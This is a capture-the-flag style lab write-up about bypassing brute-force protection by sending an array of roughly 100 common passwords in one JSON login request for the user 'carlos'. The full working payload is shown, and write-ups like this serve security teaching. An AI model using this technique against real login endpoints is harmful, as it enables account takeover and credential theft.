# Lab Broken brute-force protection, multiple credentials per request

>This lab is vulnerable due to a logic flaw in its brute-force protection. To solve the lab, brute-force Carlos's password, then access his account page.

>Victim's username: carlos

### Step 1
We are given the hint that multiple credentials can be sent per request...

The login POST request body looks like this:

`{
    "username":"carlos",
    "password":"f",
    "":""
}`

At first I tried adding the password parameter multiple times like:

`{
    "username":"carlos",
    "password":"a",
    "password":"b",
    "password":"c",
    "":""
}`

No luck... Then I tried to add all the passwords as a list, this worked! This was the request body that gave me access to `carlos`:

`{
"username":"carlos",
"password": [
"123456",
"password",
"12345678",
"qwerty",
"123456789",
"12345",
"1234",
"111111",
"1234567",
"dragon",
"123123",
"baseball",
"abc123",
"football",
"monkey",
"letmein",
"shadow",
"master",
"666666",
"qwertyuiop",
"123321",
"mustang",
"1234567890",
"michael",
"654321",
"superman",
"1qaz2wsx",
"7777777",
"121212",
"000000",
"qazwsx",
"123qwe",
"killer",
"trustno1",
"jordan",
"jennifer",
"zxcvbnm",
"asdfgh",
"hunter",
"buster",
"soccer",
"harley",
"batman",
"andrew",
"tigger",
"sunshine",
"iloveyou",
"2000",
"charlie",
"robert",
"thomas",
"hockey",
"ranger",
"daniel",
"starwars",
"klaster",
"112233",
"george",
"computer",
"michelle",
"jessica",
"pepper",
"1111",
"zxcvbn",
"555555",
"11111111",
"131313",
"freedom",
"777777",
"pass",
"maggie",
"159753",
"aaaaaa",
"ginger",
"princess",
"joshua",
"cheese",
"amanda",
"summer",
"love",
"ashley",
"nicole",
"chelsea",
"biteme",
"matthew",
"access",
"yankees",
"987654321",
"dallas",
"austin",
"thunder",
"taylor",
"matrix",
"mobilemail",
"mom",
"monitor",
"monitoring",
"montana",
"moon",
"moscow"]
}`

I converted the given passwords into the above format with a quick script that I created. Check out `6-script.py` in this folder!
